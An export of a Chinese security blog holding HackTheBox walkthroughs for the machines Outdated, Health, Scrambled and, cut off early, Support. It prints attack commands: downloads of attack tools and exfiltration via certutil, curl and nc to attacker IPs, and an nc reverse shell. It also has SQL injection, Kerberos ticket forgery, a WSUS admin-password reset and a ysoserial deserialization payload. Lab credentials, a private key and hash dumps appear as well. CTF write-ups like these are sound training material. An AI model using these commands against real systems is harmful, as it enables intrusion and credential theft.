BloodHound上传sharphound收集信息,下载下来分析 12345678# download SharpHound to the target&gt; certutil.exe -urlcache -f http://10.10.14.12:7778/SharpHound.exe SharpHound.exe# run SharpHound&gt; SharpHound.exe -c All --zipfilename output.zip# send the result back&gt; nc.exe 10.10.14.12 5555 &lt; output.zip 分析输出发现 btables 属于组 itstaff，并且 itstaff 有权将AddKeyCredentialLink 链接到对 DC具有psremote 访问权限的用户 sflowers Shadow Credentials根据bloodhound提示信息一步步来，首先需要利用Shadow Credentials得到sflower： Shadow Credentials - Red Teaming Experimentshttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials 基本上，我们可以为用户 sflowers添加新属性，因此，我们可以添加一个新属性作为用户 sflowers 进行身份验证的有效凭证，然后我们可以使用我们创建的新凭证来拉取sflowers 的 TGT，我们可以作为 sflowers 用于持久访问 需要用到的工具，其中Whisker可以从这个文件中提取： https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Whisker.ps1 r3motecontrol/Ghostpack-CompiledBinaries: Compiled Binaries for Ghostpack (.NET v4.0)https://github.com/r3motecontrol/Ghostpack-CompiledBinaries 按照资料中的步骤，一步步来： 123456# 添加属性，得到rubeus命令Whisker.exe add /target:sflowers# 运行上面得到的rubeus命令，获取sflowers的TGT# 得到的hash可以作为sflowers的NTLM hash NTLM : 1FCDB1F6015DCB318CC77BB2BDA14DB5 sflowers &amp; user flag然后就可以直接使用得到的hash登录sflowers用户,桌面得到user flag： 1evil-winrm -i 10.10.11.175 -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5 提权信息运行winpeas，发现可能利用的WSUS： 检查确认满足利用条件,一个非https的wsus服务器，UseWUServer值为1，机器容易受到wsus攻击。 Windows Local Privilege Escalation - HackTrickshttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus 12345reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer WUServer REG_SZ http://wsus.outdated.htb:8530reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v UseWUServer UseWUServer REG_DWORD 0x1 提权 &amp; root flag利用WSUS执行任意命令，例如修改管理员密码： PayloadsAllTheThings/Active Directory Attack.md at master · swisskyrepo/PayloadsAllTheThingshttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment 12345678# 创建更新SharpWSUS.exe create /payload:\"C:\\Users\\sflowers\\Desktop\\PsExec64.exe\" /args:\"-accepteula -s -d cmd.exe /c \\\"net user Administrator Password123! \\\"\" /title:\"miaomiao\"# 批准更新SharpWSUS.exe approve /updateid:ca649c3a-8069-4785-99ac-63cc85102856 /computername:dc.outdated.htb /groupname:\"miao2group\"# 检查安装状态SharpWSUS.exe check /updateid:ca649c3a-8069-4785-99ac-63cc85102856 /computername:dc.outdated.htb 然后就可以使用修改后的密码登录： root flag桌面得到root.txt: Hashdump这里716f1ce2e2cf38ee1210cce35eb78cb6是原本的hash，并不是我修改后的密码hash： 12345678910meterpreter &gt; hashdumpAdministrator:500:aad3b435b51404eeaad3b435b51404ee:716f1ce2e2cf38ee1210cce35eb78cb6:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a300e4031093085c7af7ac61a79e6d00:::btables:1106:aad3b435b51404eeaad3b435b51404ee:781444163f086fdf8de13de9110ed6e7:::sflowers:1108:aad3b435b51404eeaad3b435b51404ee:1fcdb1f6015dcb318cc77bb2bda14db5:::WSUSDemo:18603:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::miao:18604:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::DC$:1002:aad3b435b51404eeaad3b435b51404ee:3edb0179378edc150d5952a94e29c074:::CLIENT$:1105:aad3b435b51404eeaad3b435b51404ee:23358e899097bea6bf261c56105ab894::: 参考资料 JohnHammond/msdt-follina: Codebase to generate an msdt-follina payloadhttps://github.com/JohnHammond/msdt-follina Shadow Credentials - Red Teaming Experimentshttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Whisker.ps1 r3motecontrol/Ghostpack-CompiledBinaries: Compiled Binaries for Ghostpack (.NET v4.0)https://github.com/r3motecontrol/Ghostpack-CompiledBinaries Windows Local Privilege Escalation - HackTrickshttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus PayloadsAllTheThings/Active Directory Attack.md at master · swisskyrepo/PayloadsAllTheThingshttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment Outdated - HTB | BreachForumshttps://breached.to/Thread-Outdated-HTB HackTheBox (HTB) Writeup: Outdated [Medium] – meowmeowattackhttps://meowmeowattack.wordpress.com/2022/08/17/hackthebox-htb-writeup-walkthrough-outdated-medium/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Health - HackTheBox","slug":"Health-HackTheBox","date":"2022-08-24T07:39:19.000Z","updated":"2023-01-09T06:36:08.281Z","comments":true,"path":"2022/08/24/Health-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/08/24/Health-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/491 10.10.11.176 端口扫描22,80,和一个被过滤的3000: 12345678910111213141516171819$ nmap -sC -sV 10.10.11.176Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-24 13:59 CSTNmap scan report for 10.10.11.176Host is up (0.20s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)| 256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)|_ 256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: HTTP Monitoring Tool3000/tcp filtered pppService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 72.87 seconds 80一个使用webhook进行health check的页面： SSRF很容易想到SSRF，80去监测3000端口，结果发给我们,但不能直接使用localhost作为Monitored URL: 所以我们可以自己做个重定向，使其重定向到3000端口,获取内容,发现是gogs： 1python3 redirect.py http://127.0.0.1:3000/ redirect.py1234567891011#!/usr/bin/python3import sysfrom http.server import HTTPServer, BaseHTTPRequestHandlerclass Redirect(BaseHTTPRequestHandler): def do_GET(self): self.send_response(302) self.send_header('Location', sys.argv[1]) self.end_headers()HTTPServer((\"0.0.0.0\", 80), Redirect).serve_forever() Gogs搜索可以发现sql注入： Gogs - ‘users’/‘repos’ ‘?q’ SQL Injection - Multiple webapps Exploithttps://www.exploit-db.com/exploits/35238 后续就是一步步,sql注入获取password和salt： 1234567891011121314151617python3 redirect.py \"http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--\"&#123; \"username\": \"susanne\", \"avatar\": \"//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce\", \"username\": \"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\", \"avatar\": \"//1.gravatar.com/avatar/1\"&#125;python3 redirect.py \"http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--\"&#123; \"username\": \"susanne\", \"avatar\": \"//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce\", \"username\": \"sO3XIbeW14\", \"avatar\": \"//1.gravatar.com/avatar/1\"&#125; c crack根据规则生成hash，进行破解： 1234567echo 'sha256:10000:'$(echo 'sO3XIbeW14' | base64 | cut -c1-14)':'$(echo '66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37' | xxd -r -p | base64)sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=sudo hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txtfebruary15 user flagsusanne用户使用破解出来的密码登录ssh，user.txt: 提权信息运行pspy64，发现定时运行的相关内容： 122022/08/24 06:45:01 CMD: UID=0 PID=19678 | /bin/bash -c cd /var/www/html &amp;&amp; php artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;12022/08/24 06:45:06 CMD: UID=0 PID=19688 | mysql laravel --execute TRUNCATE tasks 对应目录下得到mysql账号密码： 12345678cat /var/www/html/.envDB_CONNECTION=mysqlDB_HOST=127.0.0.1DB_PORT=3306DB_DATABASE=laravelDB_USERNAME=laravelDB_PASSWORD=MYsql_strongestpass@2014+ 查看HealthChecker.php，可以知道是通过file_get_contents去获取我们指定的monitoredUrl内容，而这个信息是在数据库中的 所以我们可以通过在数据库中修改monitoredUrl,通过webhook获取对应内容来进行任意文件读取 HealthChecker.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpnamespace App\\Http\\Controllers;class HealthChecker&#123; public static function check($webhookUrl, $monitoredUrl, $onlyError = false) &#123; $json = []; $json['webhookUrl'] = $webhookUrl; $json['monitoredUrl'] = $monitoredUrl; $res = @file_get_contents($monitoredUrl, false); if ($res) &#123; if ($onlyError) &#123; return $json; &#125; $json['health'] = \"up\"; $json['body'] = $res; if (isset($http_response_header)) &#123; $headers = []; $json['message'] = $http_response_header[0]; for ($i = 0; $i &lt;= count($http_response_header) - 1; $i++) &#123; $split = explode(':', $http_response_header[$i], 2); if (count($split) == 2) &#123; $headers[trim($split[0])] = trim($split[1]); &#125; else &#123; error_log(\"invalid header pair: $http_response_header[$i]\\n\"); &#125; &#125; $json['headers'] = $headers; &#125; &#125; else &#123; $json['health'] = \"down\"; &#125; $content = json_encode($json); // send $curl = curl_init($webhookUrl); curl_setopt($curl, CURLOPT_HEADER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_HTTPHEADER, array(\"Content-type: application/json\")); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, $content); curl_exec($curl); curl_close($curl); return $json; &#125;&#125; 文件读取创建一个新的webhook 数据库中修改信息,(要在webhook还没执行之前修改)： 1234mysql -Dlaravel -ularavel -pMYsql_strongestpass@2014+mysql&gt; use laravel;mysql&gt; update tasks set monitoredUrl&#x3D;&#39;file:&#x2F;&#x2F;&#x2F;root&#x2F;.ssh&#x2F;id_rsa&#39;; webhook得到对应文件内容： root_id_rsa123456789101112131415161718192021222324252627-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9&#x2F;jG5NPqc2TfW4Nlj9gEKScDJTrF0vXYnIy4yUwM4&#x2F;2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzqIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH&#x2F;KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL&#x2F;XP1hN4B7egzjcV8Rphj6XRE3bhgH7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8W6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUaeNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8&#x2F;v&#x2F;3Jeesznu+RJ+G0ezyUGfi0wpQRoDC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI&#x2F;GpGyaCnyHmb6gLQg6Kj+xnxw6DlhnqFXpOWB771WnW9yH7&#x2F;IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x&#x2F;LUyan++D+8efiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB21bLlZQECgYEA9iT13rdKQ&#x2F;zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAjnVhtw6NRFZ1Gfu21kPTCUTK34iX&#x2F;p&#x2F;doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3sqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZoufEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQzkbVWX3JRDh4vdFOBGB&#x2F;ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzTrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcBN1ZI4E59+O3Z15VgZ&#x2F;W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTDSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcppUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR&#x2F;xkIP&#x2F;Mog1avmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC&#x2F;cQbPmQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G-----END RSA PRIVATE KEY----- root flag使用读取到的私钥登录root： shadow123root:$6$CGK4O3ut$hQTwfTrsIVAL2.wTf.mNzkpipITwSLVjqTw5bN2bnXXQi8QU4lnrlnrBMZ87bzMMQEyuxnlLJIMGhKIFjZBFn&#x2F;:19130:0:99999:7:::susanne:$6$1e4aezQ4$SdT0K.JpwHFrulyYF6iHx.KItM.AjoMmpyUrk.JSb&#x2F;hit4YHeAJvrjKVZDEx8M9Hts5UE1FgJY.SC1ia3AvBt.:19129:0:99999:7:::gogs:$6$PwVrNTkQ$L5f1d4EbQ8d3BtOBhR8fijKDs6Px3x1bFbLHgIauWbdY0IWfYNLacYF0rVWlr6PmnyVza3JsBZunFlE6MF.uB0:19129:0:99999:7::: 参考资料 Gogs - ‘users’/‘repos’ ‘?q’ SQL Injection - Multiple webapps Exploithttps://www.exploit-db.com/exploits/35238 Health - HTB [Discussion] | BreachForumshttps://breached.to/Thread-Health-HTB-Discussion Writeup Health HackTheBoxhttps://gatogamer1155.github.io/hackthebox/health/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Scrambled - HackTheBox","slug":"Scrambled-HackTheBox","date":"2022-08-22T07:38:30.000Z","updated":"2022-10-08T05:51:23.793Z","comments":true,"path":"2022/08/22/Scrambled-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/08/22/Scrambled-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/476 10.10.11.168 端口扫描windows 域环境： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768$ nmap -sC -sV 10.10.11.168Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 13:03 CSTNmap scan report for 10.10.11.168Host is up (0.21s latency).Not shown: 987 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-title: Scramble Corp Intranet| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.088/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-22 05:05:23Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)|_ssl-date: 2022-08-22T05:06:46+00:00; +1s from scanner time.| ssl-cert: Subject: commonName=DC1.scrm.local| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local| Not valid before: 2022-06-09T15:30:57|_Not valid after: 2023-06-09T15:30:57445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)|_ssl-date: 2022-08-22T05:06:46+00:00; +1s from scanner time.| ssl-cert: Subject: commonName=DC1.scrm.local| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local| Not valid before: 2022-06-09T15:30:57|_Not valid after: 2023-06-09T15:30:571433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2022-08-22T05:02:03|_Not valid after: 2052-08-22T05:02:03|_ssl-date: 2022-08-22T05:06:46+00:00; +1s from scanner time.3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC1.scrm.local| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local| Not valid before: 2022-06-09T15:30:57|_Not valid after: 2023-06-09T15:30:57|_ssl-date: 2022-08-22T05:06:46+00:00; +1s from scanner time.3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)|_ssl-date: 2022-08-22T05:06:46+00:00; +1s from scanner time.| ssl-cert: Subject: commonName=DC1.scrm.local| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local| Not valid before: 2022-06-09T15:30:57|_Not valid after: 2023-06-09T15:30:57Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:| date: 2022-08-22T05:06:08|_ start_date: N/A| smb2-security-mode:| 3.1.1:|_ Message signing enabled and required| ms-sql-info:| 10.10.11.168:1433:| Version:| name: Microsoft SQL Server 2019 RTM| number: 15.00.2000.00| Product: Microsoft SQL Server 2019| Service pack level: RTM| Post-SP patches applied: false|_ TCP port: 1433Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 193.92 seconds 80网页上可以获取一些信息，例如禁用ntlm认证，以及一个用户名： ksimpson to sqlsvcksimpson的密码就是用户名，也可以枚举出有效ksimpson用户名后到这一步，添加hosts后继续： 110.10.11.168 dc1.scrm.local scrm.local 获取TGT： 1impacket-getTGT scrm.local/ksimpson:ksimpson 使用这个TGT，可以得到sqlsvc的hash： 这里如果得到报错 [-] exceptions must derive from BaseException 的话，更新impacket到最新 1234export KRB5CCNAME=ksimpson.ccacheimpacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local -request -k -no-pass# orpython3 ~/Tools/impacket/examples/GetUserSPNs.py scrm.local/ksimpson -dc-ip dc1.scrm.local -request -k -no-pass -dc-host dc1.scrm.local 破解出来sqlsvc密码 123sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txtPegasus60 sqlsvc hash1$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local&#x2F;sqlsvc*$eb5b4db56044be69b6f7dca626249a47$0ea25a602c545e8df31ee1aacb2cf808441d8f2126451938510215af44632e61bfadf07be7ac5cc32de26b16e531d3efff2ca39c489a720b739a9c4adfe63dc22720ecf658f7fe7b86c48a463573ead40882747eda12cd0ddf0060509f24798fe495362ce95a5252094fd0b54fe41f2b1b892edaff8cf84a746d86b35c8e08eec629cfd24406fb451afea2bf748277293579f3218e38fc4eb5d73a9d6c76f5dfda8d1183a49ecacbed505c8da872a87f813ccee272f85ae2a422e1d2ab4a078e6fbc7af95e658dad9bf990a9de0fe4c1d4a5db814f66b3347c3e8c1e5fdccd7637f1ae3646065a2e55166be3aa9e206ca23b95c75f63eac69d36eee7dbfa7e4096c4f218ae19be6e1a25499c621873ef482518991c00246705900df6de15762f7c7893551f54ed8c353ae53e4f2061451c8087d935b8ddca5f62b547326fb4511056d9311bfe5ed6e51686704647d468d143abdc0830ffc0cd79e6b70c66541ea36448820d6e5bdd8aae694edad9b111659d94be3ba3f4d912c441f40fcc7d53eef48138ff17afc045e9ef8c0b41bfef961778f967024ad1b66f8eec7c15a763210649f348fbddd8317dfae66d4e0263092fcca508b9a89972999b58b0b6e3c6f4c7b675bab646975261c4a84302e4adab1cbda830e1dc80a8e2bdd354890957c6ae1b264a113b7a0deed77491cb23b3de15aac566c1f9da48a78dd7de7fa2f0bd79c78eb10dd227c1a0ea562f0419cedd1850c97723aa4d8cb03cd4f60143e065ec9d2a357112d7e8f69f60ec1298932605a223286921cc9fe533b01cf59a5817c2741e070f3972899292ae71934e569ca7b6b46406f8639b01e4ffb1747ec3b7772cda9d3269000bd52a8c67f4641281053f2c152e7f971dedae15065ea797f34f64ecae3c4761022c8b9198011599ef8b07164794b3e7c747ffb54b47fa1282f0881bd6626ab0d4a9e621bb24c620d92a490f15cd7b3e710a667aa8b6f1ac3d40cbc943f603bd6275e3becee1fb4e9569426371884709a4814aaca3ebda02902537b49f3a93d4f48772fe7053f5689e057c6be7d9b2f7a520fa8c3d08b67e99e1aa1cfe1ad4ff1492b3719c2b26b97ea2fcc5de920ddfea0ed4b5bf5de25a00728de933f76c24fb0c6ea460fea7367d3ede4bff28c07d8150ac84ed3d92debabc6855e492e96e096d33ceda702e53d4657b42efa8eb8e24a65fc6c561fe86ffdd123c7ed7ba8e15bbf888949b5f8476b12abb9b47f0d44729c16f8b78b85f40c6d364e4b6f79d1b418c2914fddb589aad49da7cf27fa4f38fbb40eb5b92104cd5547a76084867990bc0022a943d09acfc1e516d77236b1057e1e1f5ff13f9616cda069aa97cae23dc57df1f187db6c2ac235adc66601e5fb872864055b7f6d16b8916c74d277631084b0147bb90402bc993de9cc3df01568313 MSSQLSVC不能直接连接数据库，还是要通过票据方式，debug模式得到域sid 123456impacket-secretsdump -k scrm.local/ksimpson@dc1.scrm.local -no-pass -debug[+] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500# Pegasus60 ntlmb999a16500b87d17ec7f2e2a68778f05 利用这些信息生成一张票据 1impacket-ticketer -domain scrm.local -spn MSSQLSVC/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 使用这个票据和mssql交互 12export KRB5CCNAME=Administrator.ccacheimpacket-mssqlclient dc1.scrm.local -k -no-pass 数据库中获取信息，得到一组ldap账号密码： 12345678SELECT name FROM master.dbo.sysdatabasesuse ScrambleHRselect * from ScrambleHR.INFORMATION_SCHEMA.TABLESselect * from UserImportLdapUser LdapPwd LdapDomain----------------- -------------------------- -------------------MiscSvc ScrambledEggs9900 scrm.local 也可以启用xp_cmdshell,执行命令： 12enable_xp_cmdshellxp_cmdshell whoami reverse shell上传一个nc，reverse shell： 12xp_cmdshell curl 10.10.14.14:7777&#x2F;nc.exe -o C:\\Temp\\nc.exexp_cmdshell C:\\Temp\\nc.exe -e powershell 10.10.14.14 4444 miscsvc &amp; user flag通过powershell，使用前面得到的miscsvc账号密码执行命令，得到user flag 12345$SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force$Cred = New-Object System.Management.Automation.PSCredential('Scrm\\MiscSvc', $SecPassword)Invoke-Command -Computer dc1 -Credential $Cred -Command &#123; whoami &#125;Invoke-Command -Computer dc1 -Credential $Cred -Command &#123; cmd /c C:\\Temp\\nc.exe -e powershell 10.10.14.14 4444 &#125; 以miscsvc身份反弹shell，桌面得到user.txt: Sales Order ClientC:\\Shares\\IT\\Apps\\Sales Order Client 目录下exe和dll，结合网页上信息，知道是4411端口服务。,下载下来分析： 12345# 直接msf方便操作curl 10.10.14.14:7777/msf.exe -o C:\\Temp\\msf.exemeterpreter &gt; download ScrambleClient.exemeterpreter &gt; download ScrambleLib.dll ScrambleClient.exe反编译，发现命令格式和UploadOrder函数反序列化： root flagBinaryFormatter反序列化，打到system 12345.\\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c \"C:\\Temp\\msf.exe\"base64 expnc 10.10.11.168 4411UPLOAD_ORDER;base64 payload 读取root flag，dump hash hashdump1234567891011121314151617administrator:500:aad3b435b51404eeaad3b435b51404ee:e2bba07a8348bca150ac6ffee6a3afbb:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0d3c072340cb5cdfca9c7f86e47a0beb:::tstar:1106:aad3b435b51404eeaad3b435b51404ee:5b8b52689acd5a0e6587f9c8d3b07fc7:::asmith:1107:aad3b435b51404eeaad3b435b51404ee:0a7e978fd5e254ce555e5fed405bba29:::sjenkins:1118:aad3b435b51404eeaad3b435b51404ee:ac5495fa8515a5e8c3437a293b405e26:::sdonington:1119:aad3b435b51404eeaad3b435b51404ee:ac5495fa8515a5e8c3437a293b405e26:::backupsvc:1601:aad3b435b51404eeaad3b435b51404ee:6f410302e092bdcf7802401cc55e4a4d:::jhall:1603:aad3b435b51404eeaad3b435b51404ee:dfdcc85f5a1c9eaf0592f36582f3b871:::rsmith:1604:aad3b435b51404eeaad3b435b51404ee:dfdcc85f5a1c9eaf0592f36582f3b871:::ehooker:1605:aad3b435b51404eeaad3b435b51404ee:a0a5fa8b2f1df7d4acfca315e4a3ba82:::khicks:1611:aad3b435b51404eeaad3b435b51404ee:589cf9b5f911fd6fe70694a4ba4bccd0:::sqlsvc:1613:aad3b435b51404eeaad3b435b51404ee:b999a16500b87d17ec7f2e2a68778f05:::miscsvc:1617:aad3b435b51404eeaad3b435b51404ee:c959a21bb08e42e36ff9f0fa434caab5:::ksimpson:1619:aad3b435b51404eeaad3b435b51404ee:5f38c0485f0c23f8dedf9bf23ffa5336:::DC1$:1000:aad3b435b51404eeaad3b435b51404ee:fcd57ce58a2ab9e221df906588a863c2:::WS01$:1120:aad3b435b51404eeaad3b435b51404ee:327202ce3bff07c2ea53d7f25d162fcb::: 参考资料 attackdebris/kerberos_enum_userlists: Collection of username lists for enumerating kerberos domain usershttps://github.com/attackdebris/kerberos_enum_userlists/ Scrambled - HTB [Discussion] | BreachForumshttps://breached.to/Thread-Scrambled-HTB-Discussion Writeup Scrambled HackTheBoxhttps://gatogamer1155.github.io/hackthebox/scrambled/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Support - HackTheBox","slug":"Support-HackTheBox","date":"2022-08-07T09:26:53.000Z","updated":"2022-12-19T01:03:56.269Z","comments":true,"path":"2022/08/07/Support-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/08/07/Support-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/484 10.10.11.174 端口扫描windows域环境： 123456789101112131415161718192021222324252627282930$ nmap -sC -sV -Pn 10.10.11.174Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-07 13:24 CSTNmap scan report for 10.10.11.174Host is up (0.31s latency).Not shown: 989 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-07 05:31:07Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)3269/tcp open tcpwrappedService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: -1s| smb2-time:| date: 2022-08-07T05:31:46|_ start_date: N/A| smb2-security-mode:| 3.1.1:|_ Message signing enabled and requiredService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 519.35 seconds SMB 445smb可以看到一些目录 12345678910└─$ smbclient -L 10.10.11.174 -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share support-tools Disk support staff tools 